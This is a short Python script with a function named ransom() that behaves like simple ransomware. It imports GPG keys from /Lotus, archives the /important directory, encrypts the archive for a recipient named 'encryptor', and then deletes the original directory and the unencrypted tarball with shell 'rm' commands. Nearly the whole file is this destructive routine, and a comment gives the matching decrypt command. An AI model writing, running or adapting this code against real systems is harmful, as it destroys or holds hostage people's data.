#! /usr/bin/env python3

import subprocess
import os
from subprocess import Popen, PIPE
import base64
from os import path



#gpg --output testdir.tar.gz --decrypt testdir.tar.gz.gpg

def ransom():
    dir1 = "important"
    #cwd = os.getcwd()
    subprocess.run(['gpg --import /Lotus/public.key /Lotus/secret.key'], shell=True)
    subprocess.run(['cd / ; tar czf ' + dir1 + '.tar.gz ' + dir1], shell=True)
    subprocess.run(['cd / ; gpg -e -r encryptor ' + dir1 + '.tar.gz'], shell=True)
    if path.exists('/' + dir1 + '.tar.gz.gpg' ) == True:
        subprocess.run(['rm -r /' + dir1], shell=True)
        subprocess.run(['rm /' + dir1 + '.tar.gz ' ], shell=True)
        print("files encrypted")
    else:
        print("files were not deleted and or encrypted")


